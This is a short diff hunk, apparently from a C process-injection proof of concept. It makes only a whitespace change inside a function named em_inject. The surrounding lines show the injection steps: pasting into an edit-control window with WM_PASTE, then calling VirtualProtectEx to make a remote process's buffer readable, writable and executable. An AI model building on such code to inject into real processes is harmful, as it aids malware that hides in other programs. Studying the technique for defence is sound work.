@@ -531,7 +531,7 @@ BOOL em_inject(void) {
       SendMessage(ecw, WM_PASTE, 0, 0);
       Sleep(WAIT_TIME);
     }
-    
+
     if(r) {
       printf("  [+] Setting %p to RWX...", embuf.p);
       if(VirtualProtectEx(hp, embuf.p, 
